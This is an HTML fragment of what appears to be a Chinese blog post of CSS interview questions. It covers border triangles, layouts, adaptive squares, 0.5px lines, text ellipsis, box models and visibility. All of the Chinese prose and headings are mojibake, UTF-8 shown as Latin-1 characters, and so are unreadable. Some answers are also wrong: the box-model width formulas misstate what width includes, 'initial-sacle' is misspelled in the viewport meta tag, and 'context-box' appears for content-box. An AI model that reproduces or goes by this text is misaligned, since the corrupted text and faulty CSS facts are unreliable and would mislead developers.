title="ç”¨çº¯CSSåˆ›å»ºä¸€ä¸ªä¸‰è§’å½¢ï¼ŸåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ç”¨çº¯CSSåˆ›å»ºä¸€ä¸ªä¸‰è§’å½¢ï¼ŸåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>é‡‡ç”¨çš„æ˜¯ç›¸é‚»è¾¹æ¡†è¿æ¥å¤„çš„å‡åˆ†åŸç†</p><p>å®ç°æ­¥éª¤ï¼š 1.é¦–å…ˆä¿è¯å…ƒç´ æ˜¯å—çº§å…ƒç´ ï¼›2.å°†å…ƒç´ å®½é«˜è®¾ä¸º0ï¼Œä¸”åªè®¾ç½®è¾¹æ¡†ï¼›3.æŠŠä»»æ„ä¸‰æ¡è¾¹éšè—ï¼ˆé¢œè‰²è®¾ä¸ºtransparentï¼‰ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="attribute">border-color</span>: transparent transparent red transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸€ä¸ªæ»¡å±å“å­—å¸ƒå±€å¦‚ä½•è®¾è®¡"><a href="#ä¸€ä¸ªæ»¡å±å“å­—å¸ƒå±€å¦‚ä½•è®¾è®¡" class="headerlink" title="ä¸€ä¸ªæ»¡å±å“å­—å¸ƒå±€å¦‚ä½•è®¾è®¡?"></a><strong>ä¸€ä¸ªæ»¡å±å“å­—å¸ƒå±€å¦‚ä½•è®¾è®¡?</strong></h2><p>ç¬¬ä¸€ç§çœŸæ­£çš„å“å­—ï¼š</p><ol><li>ä¸‰å—é«˜å®½æ˜¯ç¡®å®šçš„ï¼›</li><li>ä¸Šé¢é‚£å—ç”¨margin: 0 auto;å±…ä¸­ï¼›</li><li>ä¸‹é¢ä¸¤å—ç”¨floatæˆ–è€…inline-blockä¸æ¢è¡Œï¼›</li><li>ç”¨marginè°ƒæ•´ä½ç½®ä½¿ä»–ä»¬å±…ä¸­ã€‚</li></ol><p>ç¬¬äºŒç§å…¨å±çš„å“å­—å¸ƒå±€:<br>ä¸Šé¢çš„divè®¾ç½®æˆ100%ï¼Œä¸‹é¢çš„divåˆ†åˆ«å®½50%ï¼Œç„¶åä½¿ç”¨floatæˆ–è€…inlineä½¿å…¶ä¸æ¢è¡Œã€‚</p><h2 id="æ€ä¹ˆè®©-Chrome-æ”¯æŒå°äº-12px-çš„æ–‡å­—ï¼Ÿ"><a href="#æ€ä¹ˆè®©-Chrome-æ”¯æŒå°äº-12px-çš„æ–‡å­—ï¼Ÿ" class="headerlink" title="æ€ä¹ˆè®© Chrome æ”¯æŒå°äº 12px çš„æ–‡å­—ï¼Ÿ"></a>æ€ä¹ˆè®© Chrome æ”¯æŒå°äº 12px çš„æ–‡å­—ï¼Ÿ</h2><p>åœ¨è°·æ­Œä¸‹cssè®¾ç½®å­—ä½“å¤§å°ä¸º12pxåŠä»¥ä¸‹æ—¶ï¼Œæ˜¾ç¤ºéƒ½æ˜¯ä¸€æ ·å¤§å°ï¼Œéƒ½æ˜¯é»˜è®¤12pxã€‚</p><p>è§£å†³åŠæ³•ï¼š</p><p>ï¼ˆ1ï¼‰å¯ä»¥ä½¿ç”¨Webkitçš„å†…æ ¸çš„-webkit-text-size-adjustçš„ç§æœ‰CSSå±æ€§æ¥è§£å†³ï¼Œåªè¦åŠ äº†-webkit-text-size<br>-adjust:none;å­—ä½“å¤§å°å°±ä¸å—é™åˆ¶äº†ã€‚ä½†æ˜¯chromeæ›´æ–°åˆ°27ç‰ˆæœ¬ä¹‹åå°±ä¸å¯ä»¥ç”¨äº†ã€‚æ‰€ä»¥é«˜ç‰ˆæœ¬chromeè°·æ­Œæµè§ˆå™¨å·²ç»ä¸å†æ”¯æŒ-webkit-text-size-adjustæ ·å¼ï¼Œæ‰€ä»¥è¦ä½¿ç”¨æ—¶å€™æ…ç”¨ã€‚</p><p>ï¼ˆ2ï¼‰è¿˜å¯ä»¥ä½¿ç”¨css3çš„transformç¼©æ”¾å±æ€§-webkit-transform:scale(0.5);æ³¨æ„-webkit-transform:scale(0.<br>75);æ”¶ç¼©çš„æ˜¯æ•´ä¸ªå…ƒç´ çš„å¤§å°ï¼Œè¿™æ—¶å€™ï¼Œå¦‚æœæ˜¯å†…è”å…ƒç´ ï¼Œå¿…é¡»è¦å°†å†…è”å…ƒç´ è½¬æ¢æˆå—å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨displayï¼šblock/inline-block/â€¦ï¼›</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨å›¾ç‰‡ï¼šå¦‚æœæ˜¯å†…å®¹å›ºå®šä¸å˜æƒ…å†µä¸‹ï¼Œä½¿ç”¨å°†å°äº12pxæ–‡å­—å†…å®¹åˆ‡å‡ºåšå›¾ç‰‡ï¼Œè¿™æ ·ä¸å½±å“å…¼å®¹ä¹Ÿä¸å½±å“ç¾è§‚ã€‚</p><h2 id="è®©é¡µé¢é‡Œçš„å­—ä½“å˜æ¸…æ™°ï¼Œå˜ç»†ç”¨-CSS-æ€ä¹ˆåšï¼Ÿ"><a href="#è®©é¡µé¢é‡Œçš„å­—ä½“å˜æ¸…æ™°ï¼Œå˜ç»†ç”¨-CSS-æ€ä¹ˆåšï¼Ÿ" class="headerlink" title="è®©é¡µé¢é‡Œçš„å­—ä½“å˜æ¸…æ™°ï¼Œå˜ç»†ç”¨ CSS æ€ä¹ˆåšï¼Ÿ"></a>è®©é¡µé¢é‡Œçš„å­—ä½“å˜æ¸…æ™°ï¼Œå˜ç»†ç”¨ CSS æ€ä¹ˆåšï¼Ÿ</h2><p>webkitå†…æ ¸çš„ç§æœ‰å±æ€§ï¼š-webkit-font-smoothingï¼Œç”¨äºå­—ä½“æŠ—é”¯é½¿ï¼Œä½¿ç”¨åå­—ä½“çœ‹èµ·æ¥ä¼šæ›´æ¸…æ™°èˆ’æœã€‚</p><p>åœ¨MacOSæµ‹è¯•ç¯å¢ƒä¸‹é¢è®¾ç½®-webkit-font-smoothing:antialiased;ä½†æ˜¯è¿™ä¸ªå±æ€§ä»…ä»…æ˜¯é¢å‘MacOSï¼Œå…¶ä»–æ“ä½œç³»ç»Ÿè®¾ç½®åæ— æ•ˆã€‚</p><h2 id="æœ‰ä¸€ä¸ªé«˜åº¦è‡ªé€‚åº”çš„-divï¼Œé‡Œé¢æœ‰ä¸¤ä¸ª-divï¼Œä¸€ä¸ªé«˜åº¦-100pxï¼Œå¸Œæœ›å¦ä¸€ä¸ªå¡«æ»¡å‰©ä¸‹çš„é«˜åº¦ã€‚"><a href="#æœ‰ä¸€ä¸ªé«˜åº¦è‡ªé€‚åº”çš„-divï¼Œé‡Œé¢æœ‰ä¸¤ä¸ª-divï¼Œä¸€ä¸ªé«˜åº¦-100pxï¼Œå¸Œæœ›å¦ä¸€ä¸ªå¡«æ»¡å‰©ä¸‹çš„é«˜åº¦ã€‚" class="headerlink" title="æœ‰ä¸€ä¸ªé«˜åº¦è‡ªé€‚åº”çš„ divï¼Œé‡Œé¢æœ‰ä¸¤ä¸ª divï¼Œä¸€ä¸ªé«˜åº¦ 100pxï¼Œå¸Œæœ›å¦ä¸€ä¸ªå¡«æ»¡å‰©ä¸‹çš„é«˜åº¦ã€‚"></a>æœ‰ä¸€ä¸ªé«˜åº¦è‡ªé€‚åº”çš„ divï¼Œé‡Œé¢æœ‰ä¸¤ä¸ª divï¼Œä¸€ä¸ªé«˜åº¦ 100pxï¼Œå¸Œæœ›å¦ä¸€ä¸ªå¡«æ»¡å‰©ä¸‹çš„é«˜åº¦ã€‚</h2><p>ï¼ˆ1ï¼‰å¤–å±‚divä½¿ç”¨positionï¼šrelativeï¼›é«˜åº¦è¦æ±‚è‡ªé€‚åº”çš„divä½¿ç”¨position:absolute;top:100px;bottom:0;<br>left:0;right:0;</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨flexå¸ƒå±€ï¼Œè®¾ç½®ä¸»è½´ä¸ºç«–è½´ï¼Œç¬¬äºŒä¸ªdivçš„flex-growä¸º1ã€‚</p><h2 id="å®ç°ä¸€ä¸ªå®½é«˜è‡ªé€‚åº”çš„æ­£æ–¹å½¢"><a href="#å®ç°ä¸€ä¸ªå®½é«˜è‡ªé€‚åº”çš„æ­£æ–¹å½¢" class="headerlink" title="å®ç°ä¸€ä¸ªå®½é«˜è‡ªé€‚åº”çš„æ­£æ–¹å½¢"></a>å®ç°ä¸€ä¸ªå®½é«˜è‡ªé€‚åº”çš„æ­£æ–¹å½¢</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*1.ç¬¬ä¸€ç§æ–¹å¼æ˜¯åˆ©ç”¨vwæ¥å®ç°*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">10vw</span>;</span><br><span class="line">  <span class="attribute">background</span>: tomato;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2.ç¬¬äºŒç§æ–¹å¼æ˜¯åˆ©ç”¨å…ƒç´ çš„margin/paddingç™¾åˆ†æ¯”æ˜¯ç›¸å¯¹çˆ¶å…ƒç´ widthçš„æ€§è´¨æ¥å®ç°*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">background</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*3.ç¬¬ä¸‰ç§æ–¹å¼æ˜¯åˆ©ç”¨å­å…ƒç´ çš„margin-topçš„å€¼æ¥å®ç°çš„*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">30%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.square</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”»ä¸€æ¡-0-5px-çš„çº¿-todo"><a href="#ç”»ä¸€æ¡-0-5px-çš„çº¿-todo" class="headerlink" title="ç”»ä¸€æ¡ 0.5px çš„çº¿(todo)"></a>ç”»ä¸€æ¡ 0.5px çš„çº¿(todo)</h2><ul><li><p>é‡‡ç”¨meta viewportçš„æ–¹å¼</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; <span class="attribute">content</span>=&quot;<span class="attribute">width</span>=device-<span class="attribute">width</span>,<span class="attribute">initial</span>-sacle=<span class="number">1</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­width=device-widthè¡¨ç¤ºå°†viewportè§†çª—çš„å®½åº¦è°ƒæ•´ä¸ºè®¾å¤‡çš„å®½åº¦ï¼Œè¿™ä¸ªå®½åº¦é€šå¸¸æ˜¯æŒ‡ç‰©ç†ä¸Šå®½åº¦ã€‚é»˜è®¤çš„ç¼©æ”¾æ¯”ä¾‹ä¸º1ï¼Œå¦‚iphone 6ç«–å±çš„å®½åº¦ä¸º750pxï¼Œå®ƒçš„dpr=2ï¼Œç”¨2pxè¡¨ç¤º1pxï¼Œè¿™æ ·è®¾ç½®ä¹‹åviewportçš„å®½åº¦å°±å˜æˆ375pxã€‚(??)</p></li><li><p>é‡‡ç”¨border-imageçš„æ–¹å¼</p></li><li><p>é‡‡ç”¨transform:scale()çš„æ–¹å¼ (è‹¥åªé‡‡ç”¨transform: scaleY(0.5); ä¼šä½¿å¾—çº¿å¾ˆè™š)</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hr</span><span class="selector-class">.scale-half</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä¸€ä¸ªè‡ªé€‚åº”çŸ©å½¢ï¼Œæ°´å¹³å‚ç›´å±…ä¸­ï¼Œä¸”å®½é«˜æ¯”ä¸º-2-1"><a href="#ä¸€ä¸ªè‡ªé€‚åº”çŸ©å½¢ï¼Œæ°´å¹³å‚ç›´å±…ä¸­ï¼Œä¸”å®½é«˜æ¯”ä¸º-2-1" class="headerlink" title="ä¸€ä¸ªè‡ªé€‚åº”çŸ©å½¢ï¼Œæ°´å¹³å‚ç›´å±…ä¸­ï¼Œä¸”å®½é«˜æ¯”ä¸º 2:1"></a>ä¸€ä¸ªè‡ªé€‚åº”çŸ©å½¢ï¼Œæ°´å¹³å‚ç›´å±…ä¸­ï¼Œä¸”å®½é«˜æ¯”ä¸º 2:1</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*å®ç°åŸç†å‚è€ƒè‡ªé€‚åº”æ­£æ–¹å½¢å’Œæ°´å¹³å±…ä¸­æ–¹å¼*/</span></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">background</span>: tomato;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="css-å®ç°ä¸Šä¸‹å›ºå®šä¸­é—´è‡ªé€‚åº”å¸ƒå±€ï¼Ÿ"><a href="#css-å®ç°ä¸Šä¸‹å›ºå®šä¸­é—´è‡ªé€‚åº”å¸ƒå±€ï¼Ÿ" class="headerlink" title="css å®ç°ä¸Šä¸‹å›ºå®šä¸­é—´è‡ªé€‚åº”å¸ƒå±€ï¼Ÿ"></a>css å®ç°ä¸Šä¸‹å›ºå®šä¸­é—´è‡ªé€‚åº”å¸ƒå±€ï¼Ÿ</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨ç»å¯¹å®šä½å®ç°<span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="attribute">flex</span>å¸ƒå±€å®ç°<span class="selector-tag">html</span>,</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•å®ç°å•è¡Œï¼å¤šè¡Œæ–‡æœ¬æº¢å‡ºçš„çœç•¥ï¼ˆâ€¦ï¼‰ï¼Ÿ"><a href="#å¦‚ä½•å®ç°å•è¡Œï¼å¤šè¡Œæ–‡æœ¬æº¢å‡ºçš„çœç•¥ï¼ˆâ€¦ï¼‰ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°å•è¡Œï¼å¤šè¡Œæ–‡æœ¬æº¢å‡ºçš„çœç•¥ï¼ˆâ€¦ï¼‰ï¼Ÿ"></a>å¦‚ä½•å®ç°å•è¡Œï¼å¤šè¡Œæ–‡æœ¬æº¢å‡ºçš„çœç•¥ï¼ˆâ€¦ï¼‰ï¼Ÿ</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*å•è¡Œæ–‡æœ¬æº¢å‡º*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*å¤šè¡Œæ–‡æœ¬æº¢å‡º*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.5em</span>;</span><br><span class="line">  <span class="comment">/*é«˜åº¦ä¸ºéœ€è¦æ˜¾ç¤ºçš„è¡Œæ•°*è¡Œé«˜ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘ä»¬æ˜¾ç¤ºä¸¤è¡Œï¼Œåˆ™ä¸º3*/</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">3em</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span>:after &#123;</span><br><span class="line">  content: <span class="string">&#x27;...&#x27;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¦‚æœéœ€è¦æ‰‹åŠ¨å†™åŠ¨ç”»ï¼Œä½ è®¤ä¸ºæœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆï¼Ÿ"><a href="#å¦‚æœéœ€è¦æ‰‹åŠ¨å†™åŠ¨ç”»ï¼Œä½ è®¤ä¸ºæœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆï¼Ÿ" class="headerlink" title="å¦‚æœéœ€è¦æ‰‹åŠ¨å†™åŠ¨ç”»ï¼Œä½ è®¤ä¸ºæœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆï¼Ÿ"></a>å¦‚æœéœ€è¦æ‰‹åŠ¨å†™åŠ¨ç”»ï¼Œä½ è®¤ä¸ºæœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</h2><p>å¤šæ•°æ˜¾ç¤ºå™¨é»˜è®¤é¢‘ç‡æ˜¯60Hzï¼Œå³1ç§’åˆ·æ–°60æ¬¡ï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ€å°é—´éš”ä¸º1/60*1000msï¼16.7ms</p><h1 id="æ¯”è¾ƒ"><a href="#æ¯”è¾ƒ" class="headerlink" title="æ¯”è¾ƒ"></a>æ¯”è¾ƒ</h1><h2 id="æ ‡å‡†çš„CSSç›’å­æ¨¡å‹å’Œä½ç‰ˆæœ¬çš„IEç›’å­æ¨¡å‹çš„åŒºåˆ«ï¼Ÿ"><a href="#æ ‡å‡†çš„CSSç›’å­æ¨¡å‹å’Œä½ç‰ˆæœ¬çš„IEç›’å­æ¨¡å‹çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="æ ‡å‡†çš„CSSç›’å­æ¨¡å‹å’Œä½ç‰ˆæœ¬çš„IEç›’å­æ¨¡å‹çš„åŒºåˆ«ï¼Ÿ"></a>æ ‡å‡†çš„CSSç›’å­æ¨¡å‹å’Œä½ç‰ˆæœ¬çš„IEç›’å­æ¨¡å‹çš„åŒºåˆ«ï¼Ÿ</h2><ul><li>æ ‡å‡†ï¼ˆW3Cï¼‰ç›’å­æ¨¡å‹ï¼š<code>width</code> = å†…å®¹å®½åº¦<code>ï¼ˆcontentï¼‰ + border + padding + margin</code></li><li>ä½ç‰ˆæœ¬IEç›’å­æ¨¡å‹ï¼š <code>width</code> = å†…å®¹å®½åº¦<code>ï¼ˆcontent + border + paddingï¼‰+ margin</code></li></ul><p>åŒºåˆ«ï¼š æ ‡å‡†ç›’å­æ¨¡å‹ ç›’å­çš„<code>height</code>å’Œ<code>width</code>æ˜¯<code>content</code>ï¼ˆå†…å®¹ï¼‰çš„å®½é«˜ï¼Œè€ŒIEç›’å­æ¨¡å‹ç›’å­çš„å®½é«˜åˆ™åŒ…æ‹¬<code>content+padding+border</code>éƒ¨åˆ†ã€‚</p><h3 id="box-sizingå±æ€§ï¼Ÿ"><a href="#box-sizingå±æ€§ï¼Ÿ" class="headerlink" title="box-sizingå±æ€§ï¼Ÿ"></a><strong>box-sizingå±æ€§ï¼Ÿ</strong></h3><p>ç”¨æ¥æ§åˆ¶å…ƒç´ çš„ç›’å­æ¨¡å‹çš„è§£ææ¨¡å¼ï¼Œé»˜è®¤ä¸ºcontent-box</p><ul><li>context-boxï¼šW3Cçš„æ ‡å‡†ç›’å­æ¨¡å‹</li><li>border-boxï¼šIEä¼ ç»Ÿç›’å­æ¨¡å‹</li></ul><h2 id="rgba-å’Œ-opacity-çš„é€æ˜æ•ˆæœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"><a href="#rgba-å’Œ-opacity-çš„é€æ˜æ•ˆæœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ" class="headerlink" title="rgba() å’Œ opacity çš„é€æ˜æ•ˆæœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"></a>rgba() å’Œ opacity çš„é€æ˜æ•ˆæœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</h2><p><code>opacity</code> ä½œç”¨äºå…ƒç´ ä»¥åŠå…ƒç´ å†…çš„æ‰€æœ‰å†…å®¹ï¼ˆåŒ…æ‹¬æ–‡å­—ï¼‰çš„é€æ˜åº¦ï¼›</p><p><code>rgba() </code>åªä½œç”¨äºå…ƒç´ è‡ªèº«çš„é¢œè‰²æˆ–å…¶èƒŒæ™¯è‰²ï¼Œå­å…ƒç´ ä¸ä¼šç»§æ‰¿é€æ˜æ•ˆæœï¼›</p><h2 id="display-noneä¸visibilityï¼šhiddençš„åŒºåˆ«ï¼Ÿ"><a href="#display-noneä¸visibilityï¼šhiddençš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="display:noneä¸visibilityï¼šhiddençš„åŒºåˆ«ï¼Ÿ"></a>display:noneä¸visibilityï¼šhiddençš„åŒºåˆ«ï¼Ÿ</h2><p>displayï¼šnone ä¸æ˜¾ç¤ºå¯¹åº”çš„å…ƒç´ ï¼Œåœ¨æ–‡æ¡£å¸ƒå±€ä¸­ä¸å†åˆ†é…ç©ºé—´ï¼ˆå›æµ+é‡ç»˜ï¼‰<br>visibilityï¼šhidden éšè—å¯¹åº”å…ƒç´ ï¼Œåœ¨æ–‡æ¡£å¸ƒå±€ä¸­ä»ä¿ç•™åŸæ¥çš„ç©ºé—´ï¼ˆé‡ç»˜ï¼‰</p><h2 id="absolute-çš„-containingblockï¼ˆåŒ…å«å—ï¼‰è®¡ç®—æ–¹å¼è·Ÿæ­£å¸¸æµæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"><a href="#absolute-çš„-containingblockï¼ˆåŒ…å«å—ï¼‰è®¡ç®—æ–¹å¼è·Ÿæ­£å¸¸æµæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ" class="headerlink" title="absolute çš„ containingblockï¼ˆåŒ…å«å—ï¼‰è®¡ç®—æ–¹å¼è·Ÿæ­£å¸¸æµæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ"></a>absolute çš„ containingblockï¼ˆåŒ…å«å—ï¼‰è®¡ç®—æ–¹å¼è·Ÿæ­£å¸¸æµæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å†…è”å…ƒç´ ä¹Ÿå¯ä»¥ä½œä¸ºâ€œåŒ…å«å—â€æ‰€åœ¨çš„å…ƒç´ ï¼›</p><p>ï¼ˆ2ï¼‰â€œåŒ…å«å—â€æ‰€åœ¨çš„å…ƒç´ ä¸æ˜¯çˆ¶å—çº§å…ƒç´ ï¼Œè€Œæ˜¯æœ€è¿‘çš„positionä¸ä¸ºstaticçš„ç¥–å…ˆå…ƒç´ æˆ–æ ¹å…ƒç´ ï¼›</p><p>ï¼ˆ3ï¼‰è¾¹ç•Œæ˜¯padding boxè€Œä¸æ˜¯content boxã€‚</p><h2 id="width-auto-å’Œ-width-100-çš„åŒºåˆ«"><a href="#width-auto-å’Œ-width-100-çš„åŒºåˆ«" class="headerlink" title="width:auto å’Œ width:100%çš„åŒºåˆ«"></a>width:auto å’Œ width:100%çš„åŒºåˆ«</h2><ul><li><p>width:100%ä¼šä½¿å…ƒç´ boxçš„å®½åº¦ç­‰äºçˆ¶å…ƒç´ çš„content boxçš„å®½åº¦ã€‚</p></li><li><p>width:autoä¼šä½¿å…ƒç´ æ’‘æ»¡æ•´ä¸ªçˆ¶å…ƒç´ ï¼Œmarginã€borderã€paddingã€contentåŒºåŸŸä¼šè‡ªåŠ¨åˆ†é…æ°´å¹³ç©ºé—´ã€‚</p></li></ul><h2 id="CSS-é‡Œçš„-visibility-å±æ€§æœ‰ä¸ª-collapse-å±æ€§å€¼æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿåœ¨ä¸åŒæµè§ˆå™¨ä¸‹ä»¥åä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#CSS-é‡Œçš„-visibility-å±æ€§æœ‰ä¸ª-collapse-å±æ€§å€¼æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿåœ¨ä¸åŒæµè§ˆå™¨ä¸‹ä»¥åä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="CSS é‡Œçš„ visibility å±æ€§æœ‰ä¸ª collapse å±æ€§å€¼æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿåœ¨ä¸åŒæµè§ˆå™¨ä¸‹ä»¥åä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>CSS é‡Œçš„ visibility å±æ€§æœ‰ä¸ª collapse å±æ€§å€¼æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿåœ¨ä¸åŒæµè§ˆå™¨ä¸‹ä»¥åä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å¯¹äºä¸€èˆ¬çš„å…ƒç´ ï¼Œå®ƒçš„è¡¨ç°è·Ÿvisibilityï¼šhidden;æ˜¯ä¸€æ ·çš„ã€‚å…ƒç´ 